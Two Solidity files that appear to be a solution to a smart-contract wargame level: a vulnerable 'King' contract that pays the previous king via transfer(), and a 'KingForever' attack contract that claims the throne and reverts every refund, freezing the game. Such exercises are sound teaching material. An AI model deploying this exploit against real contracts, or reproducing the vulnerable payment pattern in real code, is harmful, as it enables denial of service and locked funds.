// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
	address king;
	uint256 public prize;
	address public owner;

	constructor() payable {
		owner = msg.sender;
		king = msg.sender;
		prize = msg.value;
	}

	receive() external payable {
		require(msg.value >= prize || msg.sender == owner);
		payable(king).transfer(msg.value);
		king = msg.sender;
		prize = msg.value;
	}

	function _king() public view returns (address) {
		return king;
	}
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./King.sol";

contract KingForever {
	King private king;

	constructor(address payable _king) {
		king = King(_king);
	}

	receive() external payable {
		revert("I will be king forever!");
	}

	function claimKingship() public payable {
		(bool sent, ) = address(king).call{value: msg.value}("");
		require(sent, "Failed to send Ether");
	}
}